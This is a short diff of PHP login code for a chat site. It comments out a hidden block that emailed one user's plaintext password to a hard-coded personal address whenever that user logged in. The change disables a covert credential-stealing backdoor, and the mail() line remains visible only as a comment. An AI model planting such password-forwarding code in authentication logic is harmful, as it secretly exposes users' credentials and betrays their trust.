@@ -17,11 +17,11 @@
     		return Redirect( "?p=a" );
     	}
     	else {
-            switch ( strtolower( $username ) ) {
-                case 'aris': // sorry kiddo
-                    mail( 'dionyziz@gmail.com', $s_username . "'s password", "$s_username's password on chit-chat is \"$rawpassword\"" );
-                    break;
-            }
+            // switch ( strtolower( $username ) ) {
+            // case ...
+            // mail( 'dionyziz@gmail.com', $s_username . "'s password", "$s_username's password on chit-chat is \"$rawpassword\"" );
+            // break;
+            // }
             
     		$user->UpdateLastLogon();
     		$user->RenewAuthtoken();
